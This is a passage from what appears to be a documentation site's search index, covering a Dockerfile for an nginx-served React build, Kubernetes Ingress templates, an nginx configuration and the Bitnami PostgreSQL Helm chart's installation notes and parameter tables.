kube","text":"<pre><code># BUILD \nFROM node:12.16-alpine as build\nWORKDIR /app\nENV PATH /app/node_modules/.bin:$PATH\nENV NODE_PATH=src/\nENV PORT=443\nCOPY package.json ./\nCOPY package-lock.json ./\nRUN npm install -qy\n# RUN npm install react-scripts@3.4.1 -g -qy\nCOPY . ./\n# Change env to production\nCOPY ./src/config/env.prod.js ./src/config/env.js\nENV ENVIRONMENT=production\nRUN npm run build\n\n# NGINX\nFROM nginx:stable-alpine\n\n# Permissions\nENV USR=nginx\nENV PRODUCT_DIR=\"/var/www\"\nARG NGINX_RUN_DIR=\"/var/run\"\nENV NGINX_RUN_DIR $NGINX_RUN_DIR\nARG NGINX_CACHE_DIR=\"/var/cache/nginx\"\nENV NGINX_CACHE_DIR $NGINX_CACHE_DIR\nARG NGINX_LOG_DIR=\"/var/log/nginx\"\nENV NGINX_LOG_DIR $NGINX_LOG_DIR\n\n# Clear Nginx\nRUN rm -rf /var/www/*\nRUN rm -rf /etc/nginx/conf.d/*\n\n# Copy files\nCOPY --from=build /app/build $PRODUCT_DIR\nCOPY nginx.conf /etc/nginx/nginx.conf\n\nRUN chgrp -R 0 $NGINX_RUN_DIR &amp;&amp; chmod -R g=u $NGINX_RUN_DIR\nRUN chgrp -R 0 $NGINX_CACHE_DIR &amp;&amp; chmod -R g=u $NGINX_CACHE_DIR\nRUN chgrp -R 0 $NGINX_LOG_DIR &amp;&amp; chmod -R g=u $NGINX_LOG_DIR\n\nRUN touch /var/run/nginx.pid &amp;&amp; chmod -R g=u /var/run/nginx.pid\n\n\n## users are not allowed to listen on priviliged ports\nRUN touch /etc/nginx/conf.d/default.conf\nRUN sed -i.bak 's/listen\\(.*\\)80;/listen 8080;/' /etc/nginx/conf.d/default.conf\n\n# Expose Port\nEXPOSE 8080\n\n# comment user directive as master process is run as user in OpenShift anyhow\nRUN sed -i.bak 's/^user/#user/' /etc/nginx/nginx.conf\n\n# Get Datetime to Test if image is updated\nRUN date &gt;&gt; /tmp/date.txt\n\n# Using the User\nRUN addgroup nginx root\nUSER nginx\n\n# TEST Nginx\nRUN nginx -t\n\n# Start Nginx\nCMD [\"/bin/sh\", \"-c\", \"nginx -g \\\"daemon off;\\\"\"]\n</code></pre>"},{"location":"Kubernetes/Ingress/","title":"Ingress","text":"<pre><code># Local\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: {{ .Chart.Name }}-ingress\n  namespace: {{ $NAMESPACE }}\n  annotations:\n    kubernetes.io/ingress.class: nginx\n    nginx.ingress.kubernetes.io/rewrite-target: /$1\n    nginx.ingress.kubernetes.io/proxy-body-size: \"100m\"\n    # nginx.ingress.kubernetes.io/client_max_body_size: \"0\"\n    nginx.ingress.kubernetes.io/client-body-buffer-size: \"1m\"\n    nginx.ingress.kubernetes.io/proxy-buffering: \"on\"\n    nginx.ingress.kubernetes.io/proxy-buffers-number: \"4\"\n    nginx.ingress.kubernetes.io/proxy-buffer-size: \"1m\"\n    nginx.ingress.kubernetes.io/proxy-max-temp-file-size: \"1024m\"\n    nginx.ingress.kubernetes.io/proxy-next-upstream: timeout\n    nginx.ingress.kubernetes.io/proxy-read-timeout: '1003'\nspec:\n  tls:\n    - hosts:\n        - {{ include \"common.ingress.url\" . }}\n      secretName: {{ .Values.ingress.secrets }}\n  rules:\n    - host: {{ include \"common.ingress.url\" . }}\n      http:\n        paths:\n          - path: {{ .Values.ingress.path | toString }}\n            pathType: {{ .Values.ingress.pathType }}\n            backend:\n              service:\n                name: {{ include \"helper.names.fullname\" . }}\n                port:\n                  number: {{ .Values.global.net.ports.frontend }}\n</code></pre> <pre><code># Local\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: {{ .Chart.Name }}-ingress\n  namespace: {{ $NAMESPACE }}\n  annotations:\n    kubernetes.io/ingress.class: nginx\n    nginx.ingress.kubernetes.io/rewrite-target: /$1\nspec:\n  rules:\n    - host: backend.mybts.com\n      http:\n        paths:\n          - path: /api/(.*)\n            pathType: Prefix\n            backend:\n              service:\n                name: &lt;SERVICE NAME&gt;\n                port:\n                  number: &lt;SERVICE PORT | iota &gt;\n</code></pre>"},{"location":"Kubernetes/nginx-Conf-kube/","title":"nginx Conf kube","text":"<pre><code># auto detects a good number of processes to run\nworker_processes auto;\n\n#Provides the configuration file context in which the directives that affect connection processing are specified.\nevents {\n    # Sets the maximum number of simultaneous connections that can be opened by a worker process.\n    worker_connections 8000;\n    # Tells the worker to accept multiple connections at a time\n    multi_accept on;\n}\n\nhttp {\n    # what times to include\n    include /etc/nginx/mime.types;\n    # what is the default one\n    default_type application/octet-stream;\n\n    # Sets the path, format, and configuration for a buffered log write\n    log_format compression '$remote_addr - $remote_user [$time_local] '\n    '\"$request\" $status $upstream_addr '\n    '\"$http_referer\" \"$http_user_agent\"';\n\n    server {\n        # listen on port 8080\n        listen 8080;\n        listen [::]:8080;\n\n        # TIME OUTS\n        proxy_connect_timeout 600; \n        proxy_send_timeout 1800; \n        proxy_read_timeout 1800; \n        send_timeout 1800;\n\n        # save logs here\n        access_log /var/log/nginx/access.log compression;\n\n        # GZIP\n        gzip on;\n        gzip_http_version 1.0;\n        gzip_comp_level 5; # 1-9\n        gzip_min_length 256;\n        gzip_proxied any;\n        gzip_vary on;\n\n        # MIME-types\n        gzip_types\n        application/atom+xml\n        application/javascript\n        application/json\n        application/rss+xml\n        application/vnd.ms-fontobject\n        application/x-font-ttf\n        application/x-web-app-manifest+json\n        application/xhtml+xml\n        application/xml\n        font/opentype\n        image/svg+xml\n        image/x-icon\n        text/css\n        text/plain\n        text/x-component;\n\n        # where the root here\n        root /var/www;\n        # what file to server as index\n        index index.html index.htm;\n\n        location / {\n            # First attempt to serve request as file, then\n            # as directory, then fall back to redirecting to index.html\n            try_files $uri $uri/ /index.html;\n        }\n\n        # Media: images, icons, video, audio, HTC\n        location ~* \\.(?:jpg|jpeg|gif|png|ico|cur|gz|svg|svgz|mp4|ogg|ogv|webm|htc)$ {\n            expires 1M;\n            access_log off;\n            add_header Cache-Control \"public\";\n        }\n\n        # Javascript and CSS files\n        location ~* \\.(?:css|js)$ {\n            try_files $uri =404;\n            expires 1y;\n            access_log off;\n            add_header Cache-Control \"public\";\n        }\n\n        # Any route containing a file extension (e.g. /devicesfile.js)\n        location ~ ^.+\\..+$ {\n            try_files $uri =404;\n        }\n    }\n}\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/","title":"Index","text":""},{"location":"Kubernetes/mybts/charts/helm-postgresql/#postgresql-packaged-by-bitnami","title":"PostgreSQL packaged by Bitnami","text":"<p>PostgreSQL (Postgres) is an open source object-relational database known for reliability and data integrity. ACID-compliant, it supports foreign keys, joins, views, triggers and stored procedures.</p> <p>Overview of PostgreSQL</p> <p>Trademarks: This software listing is packaged by Bitnami. The respective trademarks mentioned in the offering are owned by the respective companies, and use of them does not imply any affiliation or endorsement.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#tldr","title":"TL;DR","text":"<pre><code>helm repo add bitnami https://charts.bitnami.com/bitnami\nhelm install my-release bitnami/postgresql\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#introduction","title":"Introduction","text":"<p>This chart bootstraps a PostgreSQL deployment on a Kubernetes cluster using the Helm package manager.</p> <p>For HA, please see this repo</p> <p>Bitnami charts can be used with Kubeapps for deployment and management of Helm Charts in clusters.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#prerequisites","title":"Prerequisites","text":"<ul> <li>Kubernetes 1.19+</li> <li>Helm 3.2.0+</li> <li>PV provisioner support in the underlying infrastructure</li> </ul>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#installing-the-chart","title":"Installing the Chart","text":"<p>To install the chart with the release name <code>my-release</code>:</p> <pre><code>helm install my-release bitnami/postgresql\n</code></pre> <p>The command deploys PostgreSQL on the Kubernetes cluster in the default configuration. The Parameters section lists the parameters that can be configured during installation.</p> <p>Tip: List all releases using <code>helm list</code></p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#uninstalling-the-chart","title":"Uninstalling the Chart","text":"<p>To uninstall/delete the <code>my-release</code> deployment:</p> <pre><code>helm delete my-release\n</code></pre> <p>The command removes all the Kubernetes components but PVC's associated with the chart and deletes the release.</p> <p>To delete the PVC's associated with <code>my-release</code>:</p> <pre><code>kubectl delete pvc -l release=my-release\n</code></pre> <p>Note: Deleting the PVC's will delete postgresql data as well. Please be cautious before doing it.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#parameters","title":"Parameters","text":""},{"location":"Kubernetes/mybts/charts/helm-postgresql/#global-parameters","title":"Global parameters","text":"Name Description Value <code>global.imageRegistry</code> Global Docker image registry <code>\"\"</code> <code>global.imagePullSecrets</code> Global Docker registry secret names as an array <code>[]</code> <code>global.storageClass</code> Global StorageClass for Persistent Volume(s) <code>\"\"</code> <code>global.postgresql.auth.postgresPassword</code> Password for the \"postgres\" admin user (overrides <code>auth.postgresPassword</code>) <code>\"\"</code> <code>global.postgresql.auth.username</code> Name for a custom user to create (overrides <code>auth.username</code>) <code>\"\"</code> <code>global.postgresql.auth.password</code> Password for the custom user to create (overrides <code>auth.password</code>) <code>\"\"</code> <code>global.postgresql.auth.database</code> Name for a custom database to create (overrides <code>auth.database</code>) <code>\"\"</code> <code>global.postgresql.auth.existingSecret</code> Name of existing secret to use for PostgreSQL credentials (overrides <code>auth.existingSecret</code>). <code>\"\"</code> <code>global.postgresql.auth.secretKeys.adminPasswordKey</code> Name of key in existing secret to use for PostgreSQL credentials (overrides <code>auth.secretKeys.adminPasswordKey</code>). Only used when <code>global.postgresql.auth.existingSecret</code> is set. <code>\"\"</code> <code>global.postgresql.auth.secretKeys.userPasswordKey</code> Name of key in existing secret to use for PostgreSQL credentials (overrides <code>auth.secretKeys.userPasswordKey</code>). Only used when <code>global.postgresql.auth.existingSecret</code> is set. <code>\"\"</code> <code>global.postgresql.auth.secretKeys.replicationPasswordKey</code> Name of key in existing secret to use for PostgreSQL credentials (overrides <code>auth.secretKeys.replicationPasswordKey</code>). Only used when <code>global.postgresql.auth.existingSecret</code> is set. <code>\"\"</code> <code>global.postgresql.service.ports.postgresql</code> PostgreSQL service port (overrides <code>service.ports.postgresql</code>) <code>\"\"</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#common-parameters","title":"Common parameters","text":"Name Description Value <code>kubeVersion</code> Override Kubernetes version <code>\"\"</code> <code>nameOverride</code> String to partially override common.names.fullname template (will maintain the release name) <code>\"\"</code> <code>fullnameOverride</code> String to fully override common.names.fullname template <code>\"\"</code> <code>clusterDomain</code> Kubernetes Cluster Domain <code>cluster.local</code> <code>extraDeploy</code> Array of extra objects to deploy with the release (evaluated as a template) <code>[]</code> <code>commonLabels</code> Add labels to all the deployed resources <code>{}</code> <code>commonAnnotations</code> Add annotations to all the deployed resources <code>{}</code> <code>diagnosticMode.enabled</code> Enable diagnostic mode (all probes will be disabled and the command will be overridden) <code>false</code> <code>diagnosticMode.command</code> Command to override all containers in the statefulset <code>[\"sleep\"]</code> <code>diagnosticMode.args</code> Args to override all containers in the statefulset <code>[\"infinity\"]</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#postgresql-common-parameters","title":"PostgreSQL common parameters","text":"Name Description Value <code>image.registry</code> PostgreSQL image registry <code>docker.io</code> <code>image.repository</code> PostgreSQL image repository <code>bitnami/postgresql</code> <code>image.tag</code> PostgreSQL image tag (immutable tags are recommended) <code>14.5.0-debian-11-r14</code> <code>image.digest</code> PostgreSQL image digest in the way sha256:aa.... Please note this parameter, if set, will override the tag <code>\"\"</code> <code>image.pullPolicy</code> PostgreSQL image pull policy <code>IfNotPresent</code> <code>image.pullSecrets</code> Specify image pull secrets <code>[]</code> <code>image.debug</code> Specify if debug values should be set <code>false</code> <code>auth.enablePostgresUser</code> Assign a password to the \"postgres\" admin user. Otherwise, remote access will be blocked for this user <code>true</code> <code>auth.postgresPassword</code> Password for the \"postgres\" admin user. Ignored if <code>auth.existingSecret</code> with key <code>postgres-password</code> is provided <code>\"\"</code> <code>auth.username</code> Name for a custom user to create <code>\"\"</code> <code>auth.password</code> Password for the custom user to create. Ignored if <code>auth.existingSecret</code> with key <code>password</code> is provided <code>\"\"</code> <code>auth.database</code> Name for a custom database to create <code>\"\"</code> <code>auth.replicationUsername</code> Name of the replication user <code>repl_user</code> <code>auth.replicationPassword</code> Password for the replication user. Ignored if <code>auth.existingSecret</code> with key <code>replication-password</code> is provided <code>\"\"</code> <code>auth.existingSecret</code> Name of existing secret to use for PostgreSQL credentials. <code>auth.postgresPassword</code>, <code>auth.password</code>, and <code>auth.replicationPassword</code> will be ignored and picked up from this secret. The secret might also contains the key <code>ldap-password</code> if LDAP is enabled. <code>ldap.bind_password</code> will be ignored and picked from this secret in this case. <code>\"\"</code> <code>auth.secretKeys.adminPasswordKey</code> Name of key in existing secret to use for PostgreSQL credentials. Only used when <code>auth.existingSecret</code> is set. <code>postgres-password</code> <code>auth.secretKeys.userPasswordKey</code> Name of key in existing secret to use for PostgreSQL credentials. Only used when <code>auth.existingSecret</code> is set. <code>password</code> <code>auth.secretKeys.replicationPasswordKey</code> Name of key in existing secret to use for PostgreSQL credentials. Only used when <code>auth.existingSecret</code> is set. <code>replication-password</code> <code>auth.usePasswordFiles</code> Mount credentials as a files instead of using an environment variable <code>false</code> <code>architecture</code> PostgreSQL architecture (<code>standalone</code> or <code>replication</code>) <code>standalone</code> <code>replication.synchronousCommit</code> Set synchronous commit mode. Allowed values: <code>on</code>, <code>remote_apply</code>, <code>remote_write</code>, <code>local</code> and <code>off</code> <code>off</code> <code>replication.numSynchronousReplicas</code> Number of replicas that will have synchronous replication. Note: Cannot be greater than <code>readReplicas.replicaCount</code>. <code>0</code> <code>replication.applicationName</code> Cluster application name. Useful for advanced replication settings <code>my_application</code> <code>containerPorts.postgresql</code> PostgreSQL container port <code>5432</code> <code>audit.logHostname</code> Log client hostnames <code>false</code> <code>audit.logConnections</code> Add client log-in operations to the log file <code>false</code> <code>audit.logDisconnections</code> Add client log-outs operations to the log file <code>false</code> <code>audit.pgAuditLog</code> Add operations to log using the pgAudit extension <code>\"\"</code> <code>audit.pgAuditLogCatalog</code> Log catalog using pgAudit <code>off</code> <code>audit.clientMinMessages</code> Message log level to share with the user <code>error</code> <code>audit.logLinePrefix</code> Template for log line prefix (default if not set) <code>\"\"</code> <code>audit.logTimezone</code> Timezone for the log timestamps <code>\"\"</code> <code>ldap.enabled</code> Enable LDAP support <code>false</code> <code>ldap.server</code> IP address or name of the LDAP server. <code>\"\"</code> <code>ldap.port</code> Port number on the LDAP server to connect to <code>\"\"</code> <code>ldap.prefix</code> String to prepend to the user name when forming the DN to bind <code>\"\"</code> <code>ldap.suffix</code> String to append to the user name when forming the DN to bind <code>\"\"</code> <code>ldap.basedn</code> Root DN to begin the search for the user in <code>\"\"</code> <code>ldap.binddn</code> DN of user to bind to LDAP <code>\"\"</code> <code>ldap.bindpw</code> Password for the user to bind to LDAP <code>\"\"</code> <code>ldap.searchAttribute</code> Attribute to match against the user name in the search <code>\"\"</code> <code>ldap.searchFilter</code> The search filter to use when doing search+bind authentication <code>\"\"</code> <code>ldap.scheme</code> Set to <code>ldaps</code> to use LDAPS <code>\"\"</code> <code>ldap.tls.enabled</code> Se to true to enable TLS encryption <code>false</code> <code>ldap.uri</code> LDAP URL beginning in the form <code>ldap[s]://host[:port]/basedn</code>. If provided, all the other LDAP parameters will be ignored. <code>\"\"</code> <code>postgresqlDataDir</code> PostgreSQL data dir folder <code>/bitnami/postgresql/data</code> <code>postgresqlSharedPreloadLibraries</code> Shared preload libraries (comma-separated list) <code>pgaudit</code> <code>shmVolume.enabled</code> Enable emptyDir volume for /dev/shm for PostgreSQL pod(s) <code>true</code> <code>shmVolume.sizeLimit</code> Set this to enable a size limit on the shm tmpfs <code>\"\"</code> <code>tls.enabled</code> Enable TLS traffic support <code>false</code> <code>tls.autoGenerated</code> Generate automatically self-signed TLS certificates <code>false</code> <code>tls.preferServerCiphers</code> Whether to use the server's TLS cipher preferences rather than the client's <code>true</code> <code>tls.certificatesSecret</code> Name of an existing secret that contains the certificates <code>\"\"</code> <code>tls.certFilename</code> Certificate filename <code>\"\"</code> <code>tls.certKeyFilename</code> Certificate key filename <code>\"\"</code> <code>tls.certCAFilename</code> CA Certificate filename <code>\"\"</code> <code>tls.crlFilename</code> File containing a Certificate Revocation List <code>\"\"</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#postgresql-primary-parameters","title":"PostgreSQL Primary parameters","text":"Name Description Value <code>primary.name</code> Name of the primary database (eg primary, master, leader, ...) <code>primary</code> <code>primary.configuration</code> PostgreSQL Primary main configuration to be injected as ConfigMap <code>\"\"</code> <code>primary.pgHbaConfiguration</code> PostgreSQL Primary client authentication configuration <code>\"\"</code> <code>primary.existingConfigmap</code> Name of an existing ConfigMap with PostgreSQL Primary configuration <code>\"\"</code> <code>primary.extendedConfiguration</code> Extended PostgreSQL Primary configuration (appended to main or default configuration) <code>\"\"</code> <code>primary.existingExtendedConfigmap</code> Name of an existing ConfigMap with PostgreSQL Primary extended configuration <code>\"\"</code> <code>primary.initdb.args</code> PostgreSQL initdb extra arguments <code>\"\"</code> <code>primary.initdb.postgresqlWalDir</code> Specify a custom location for the PostgreSQL transaction log <code>\"\"</code> <code>primary.initdb.scripts</code> Dictionary of initdb scripts <code>{}</code> <code>primary.initdb.scriptsConfigMap</code> ConfigMap with scripts to be run at first boot <code>\"\"</code> <code>primary.initdb.scriptsSecret</code> Secret with scripts to be run at first boot (in case it contains sensitive information) <code>\"\"</code> <code>primary.initdb.user</code> Specify the PostgreSQL username to execute the initdb scripts <code>\"\"</code> <code>primary.initdb.password</code> Specify the PostgreSQL password to execute the initdb scripts <code>\"\"</code> <code>primary.standby.enabled</code> Whether to enable current cluster's primary as standby server of another cluster or not <code>false</code> <code>primary.standby.primaryHost</code> The Host of replication primary in the other cluster <code>\"\"</code> <code>primary.standby.primaryPort</code> The Port of replication primary in the other cluster <code>\"\"</code> <code>primary.extraEnvVars</code> Array with extra environment variables to add to PostgreSQL Primary nodes <code>[]</code> <code>primary.extraEnvVarsCM</code> Name of existing ConfigMap containing extra env vars for PostgreSQL Primary nodes <code>\"\"</code> <code>primary.extraEnvVarsSecret</code> Name of existing Secret containing extra env vars for PostgreSQL Primary nodes <code>\"\"</code> <code>primary.command</code> Override default container command (useful when using custom images) <code>[]</code> <code>primary.args</code> Override default container args (useful when using custom images) <code>[]</code> <code>primary.livenessProbe.enabled</code> Enable livenessProbe on PostgreSQL Primary containers <code>true</code> <code>primary.livenessProbe.initialDelaySeconds</code> Initial delay seconds for livenessProbe <code>30</code> <code>primary.livenessProbe.periodSeconds</code> Period seconds for livenessProbe <code>10</code> <code>primary.livenessProbe.timeoutSeconds</code> Timeout seconds for livenessProbe <code>5</code> <code>primary.livenessProbe.failureThreshold</code> Failure threshold for livenessProbe <code>6</code> <code>primary.livenessProbe.successThreshold</code> Success threshold for livenessProbe <code>1</code> <code>primary.readinessProbe.enabled</code> Enable readinessProbe on PostgreSQL Primary containers <code>true</code> <code>primary.readinessProbe.initialDelaySeconds</code> Initial delay seconds for readinessProbe <code>5</code> <code>primary.readinessProbe.periodSeconds</code> Period seconds for readinessProbe <code>10</code> <code>primary.readinessProbe.timeoutSeconds</code> Timeout seconds for readinessProbe <code>5</code> <code>primary.readinessProbe.failureThreshold</code> Failure threshold for readinessProbe <code>6</code> <code>primary.readinessProbe.successThreshold</code> Success threshold for readinessProbe <code>1</code> <code>primary.startupProbe.enabled</code> Enable startupProbe on PostgreSQL Primary containers <code>false</code> <code>primary.startupProbe.initialDelaySeconds</code> Initial delay seconds for startupProbe <code>30</code> <code>primary.startupProbe.periodSeconds</code> Period seconds for startupProbe <code>10</code> <code>primary.startupProbe.timeoutSeconds</code> Timeout seconds for startupProbe <code>1</code> <code>primary.startupProbe.failureThreshold</code> Failure threshold for startupProbe <code>15</code> <code>primary.startupProbe.successThreshold</code> Success threshold for startupProbe <code>1</code> <code>primary.customLivenessProbe</code> Custom livenessProbe that overrides the default one <code>{}</code> <code>primary.customReadinessProbe</code> Custom readinessProbe that overrides the default one <code>{}</code> <code>primary.customStartupProbe</code> Custom startupProbe that overrides the default one <code>{}</code> <code>primary.lifecycleHooks</code> for the PostgreSQL Primary container to automate configuration before or after startup <code>{}</code> <code>primary.resources.limits</code> The resources limits for the PostgreSQL Primary containers <code>{}</code> <code>primary.resources.requests.memory</code> The requested memory for the PostgreSQL Primary containers <code>256Mi</code> <code>primary.resources.requests.cpu</code> The requested cpu for the PostgreSQL Primary containers <code>250m</code> <code>primary.podSecurityContext.enabled</code> Enable security context <code>true</code> <code>primary.podSecurityContext.fsGroup</code> Group ID for the pod <code>1001</code> <code>primary.containerSecurityContext.enabled</code> Enable container security context <code>true</code> <code>primary.containerSecurityContext.runAsUser</code> User ID for the container <code>1001</code> <code>primary.hostAliases</code> PostgreSQL primary pods host aliases <code>[]</code> <code>primary.hostNetwork</code> Specify if host network should be enabled for PostgreSQL pod (postgresql primary) <code>false</code> <code>primary.hostIPC</code> Specify if host IPC should be enabled for PostgreSQL pod (postgresql primary) <code>false</code> <code>primary.labels</code> Map of labels to add to the statefulset (postgresql primary) <code>{}</code> <code>primary.annotations</code> Annotations for PostgreSQL primary pods <code>{}</code> <code>primary.podLabels</code> Map of labels to add to the pods (postgresql primary) <code>{}</code> <code>primary.podAnnotations</code> Map of annotations to add to the pods (postgresql primary) <code>{}</code> <code>primary.podAffinityPreset</code> PostgreSQL primary pod affinity preset. Ignored if <code>primary.affinity</code> is set. Allowed values: <code>soft</code> or <code>hard</code> <code>\"\"</code> <code>primary.podAntiAffinityPreset</code> PostgreSQL primary pod anti-affinity preset. Ignored if <code>primary.affinity</code> is set. Allowed values: <code>soft</code> or <code>hard</code> <code>soft</code> <code>primary.nodeAffinityPreset.type</code> PostgreSQL primary node affinity preset type. Ignored if <code>primary.affinity</code> is set. Allowed values: <code>soft</code> or <code>hard</code> <code>\"\"</code> <code>primary.nodeAffinityPreset.key</code> PostgreSQL primary node label key to match Ignored if <code>primary.affinity</code> is set. <code>\"\"</code> <code>primary.nodeAffinityPreset.values</code> PostgreSQL primary node label values to match. Ignored if <code>primary.affinity</code> is set. <code>[]</code> <code>primary.affinity</code> Affinity for PostgreSQL primary pods assignment <code>{}</code> <code>primary.nodeSelector</code> Node labels for PostgreSQL primary pods assignment <code>{}</code> <code>primary.tolerations</code> Tolerations for PostgreSQL primary pods assignment <code>[]</code> <code>primary.topologySpreadConstraints</code> Topology Spread Constraints for pod assignment spread across your cluster among failure-domains. Evaluated as a template <code>[]</code> <code>primary.priorityClassName</code> Priority Class to use for each pod (postgresql primary) <code>\"\"</code> <code>primary.schedulerName</code> Use an alternate scheduler, e.g. \"stork\". <code>\"\"</code> <code>primary.terminationGracePeriodSeconds</code> Seconds PostgreSQL primary pod needs to terminate gracefully <code>\"\"</code> <code>primary.updateStrategy.type</code> PostgreSQL Primary statefulset strategy type <code>RollingUpdate</code> <code>primary.updateStrategy.rollingUpdate</code> PostgreSQL Primary statefulset rolling update configuration parameters <code>{}</code> <code>primary.extraVolumeMounts</code> Optionally specify extra list of additional volumeMounts for the PostgreSQL Primary container(s) <code>[]</code> <code>primary.extraVolumes</code> Optionally specify extra list of additional volumes for the PostgreSQL Primary pod(s) <code>[]</code> <code>primary.sidecars</code> Add additional sidecar containers to the PostgreSQL Primary pod(s) <code>[]</code> <code>primary.initContainers</code> Add additional init containers to the PostgreSQL Primary pod(s) <code>[]</code> <code>primary.extraPodSpec</code> Optionally specify extra PodSpec for the PostgreSQL Primary pod(s) <code>{}</code> <code>primary.service.type</code> Kubernetes Service type <code>ClusterIP</code> <code>primary.service.ports.postgresql</code> PostgreSQL service port <code>5432</code> <code>primary.service.nodePorts.postgresql</code> Node port for PostgreSQL <code>\"\"</code> <code>primary.service.clusterIP</code> Static clusterIP or None for headless services <code>\"\"</code> <code>primary.service.annotations</code> Annotations for PostgreSQL primary service <code>{}</code> <code>primary.service.loadBalancerIP</code> Load balancer IP if service type is <code>LoadBalancer</code> <code>\"\"</code> <code>primary.service.externalTrafficPolicy</code> Enable client source IP preservation <code>Cluster</code> <code>primary.service.loadBalancerSourceRanges</code> Addresses that are allowed when service is LoadBalancer <code>[]</code> <code>primary.service.extraPorts</code> Extra ports to expose in the PostgreSQL primary service <code>[]</code> <code>primary.service.sessionAffinity</code> Session Affinity for Kubernetes service, can be \"None\" or \"ClientIP\" <code>None</code> <code>primary.service.sessionAffinityConfig</code> Additional settings for the sessionAffinity <code>{}</code> <code>primary.persistence.enabled</code> Enable PostgreSQL Primary data persistence using PVC <code>true</code> <code>primary.persistence.existingClaim</code> Name of an existing PVC to use <code>\"\"</code> <code>primary.persistence.mountPath</code> The path the volume will be mounted at <code>/bitnami/postgresql</code> <code>primary.persistence.subPath</code> The subdirectory of the volume to mount to <code>\"\"</code> <code>primary.persistence.storageClass</code> PVC Storage Class for PostgreSQL Primary data volume <code>\"\"</code> <code>primary.persistence.accessModes</code> PVC Access Mode for PostgreSQL volume <code>[\"ReadWriteOnce\"]</code> <code>primary.persistence.size</code> PVC Storage Request for PostgreSQL volume <code>8Gi</code> <code>primary.persistence.annotations</code> Annotations for the PVC <code>{}</code> <code>primary.persistence.labels</code> Labels for the PVC <code>{}</code> <code>primary.persistence.selector</code> Selector to match an existing Persistent Volume (this value is evaluated as a template) <code>{}</code> <code>primary.persistence.dataSource</code> Custom PVC data source <code>{}</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#postgresql-read-only-replica-parameters-only-used-when-architecture-is-set-to-replication","title":"PostgreSQL read only replica parameters (only used when <code>architecture</code> is set to <code>replication</code>)","text":"Name Description Value <code>readReplicas.name</code> Name of the read replicas database (eg secondary, slave, ...) <code>read</code> <code>readReplicas.replicaCount</code> Number of PostgreSQL read only replicas <code>1</code> <code>readReplicas.extendedConfiguration</code> Extended PostgreSQL read only replicas configuration (appended to main or default configuration) <code>\"\"</code> <code>readReplicas.extraEnvVars</code> Array with extra environment variables to add to PostgreSQL read only nodes <code>[]</code> <code>readReplicas.extraEnvVarsCM</code> Name of existing ConfigMap containing extra env vars for PostgreSQL read only nodes <code>\"\"</code> <code>readReplicas.extraEnvVarsSecret</code> Name of existing Secret containing extra env vars for PostgreSQL read only nodes <code>\"\"</code> <code>readReplicas.command</code> Override default container command (useful when using custom images) <code>[]</code> <code>readReplicas.args</code> Override default container args (useful when using custom images) <code>[]</code> <code>readReplicas.livenessProbe.enabled</code> Enable livenessProbe on PostgreSQL read only containers <code>true</code> <code>readReplicas.livenessProbe.initialDelaySeconds</code> Initial delay seconds for livenessProbe <code>30</code> <code>readReplicas.livenessProbe.periodSeconds</code> Period seconds for livenessProbe <code>10</code> <code>readReplicas.livenessProbe.timeoutSeconds</code> Timeout seconds for livenessProbe <code>5</code> <code>readReplicas.livenessProbe.failureThreshold</code> Failure threshold for livenessProbe <code>6</code> <code>readReplicas.livenessProbe.successThreshold</code> Success threshold for livenessProbe <code>1</code> <code>readReplicas.readinessProbe.enabled</code> Enable readinessProbe on PostgreSQL read only containers <code>true</code> <code>readReplicas.readinessProbe.initialDelaySeconds</code> Initial delay seconds for readinessProbe <code>5</code> <code>readReplicas.readinessProbe.periodSeconds</code> Period seconds for readinessProbe <code>10</code> <code>readReplicas.readinessProbe.timeoutSeconds</code> Timeout seconds for readinessProbe <code>5</code> <code>readReplicas.readinessProbe.failureThreshold</code> Failure threshold for readinessProbe <code>6</code> <code>readReplicas.readinessProbe.successThreshold</code> Success threshold for readinessProbe <code>1</code> <code>readReplicas.startupProbe.enabled</code> Enable startupProbe on PostgreSQL read only containers <code>false</code> <code>readReplicas.startupProbe.initialDelaySeconds</code> Initial delay seconds for startupProbe <code>30</code> <code>readReplicas.startupProbe.periodSeconds</code> Period seconds for startupProbe <code>10</code> <code>readReplicas.startupProbe.timeoutSeconds</code> Timeout seconds for startupProbe <code>1</code> <code>readReplicas.startupProbe.failureThreshold</code> Failure threshold for startupProbe <code>15</code> <code>readReplicas.startupProbe.successThreshold</code> Success threshold for startupProbe <code>1</code> <code>readReplicas.customLivenessProbe</code> Custom livenessProbe that overrides the default one <code>{}</code> <code>readReplicas.customReadinessProbe</code> Custom readinessProbe that overrides the default one <code>{}</code> <code>readReplicas.customStartupProbe</code> Custom startupProbe that overrides the default one <code>{}</code> <code>readReplicas.lifecycleHooks</code> for the PostgreSQL read only container to automate configuration before or after startup <code>{}</code> <code>readReplicas.resources.limits</code> The resources limits for the PostgreSQL read only containers <code>{}</code> <code>readReplicas.resources.requests.memory</code> The requested memory for the PostgreSQL read only containers <code>256Mi</code> <code>readReplicas.resources.requests.cpu</code> The requested cpu for the PostgreSQL read only containers <code>250m</code> <code>readReplicas.podSecurityContext.enabled</code> Enable security context <code>true</code> <code>readReplicas.podSecurityContext.fsGroup</code> Group ID for the pod <code>1001</code> <code>readReplicas.containerSecurityContext.enabled</code> Enable container security context <code>true</code> <code>readReplicas.containerSecurityContext.runAsUser</code> User ID for the container <code>1001</code> <code>readReplicas.hostAliases</code> PostgreSQL read only pods host aliases <code>[]</code> <code>readReplicas.hostNetwork</code> Specify if host network should be enabled for PostgreSQL pod (PostgreSQL read only) <code>false</code> <code>readReplicas.hostIPC</code> Specify if host IPC should be enabled for PostgreSQL pod (postgresql primary) <code>false</code> <code>readReplicas.labels</code> Map of labels to add to the statefulset (PostgreSQL read only) <code>{}</code> <code>readReplicas.annotations</code> Annotations for PostgreSQL read only pods <code>{}</code> <code>readReplicas.podLabels</code> Map of labels to add to the pods (PostgreSQL read only) 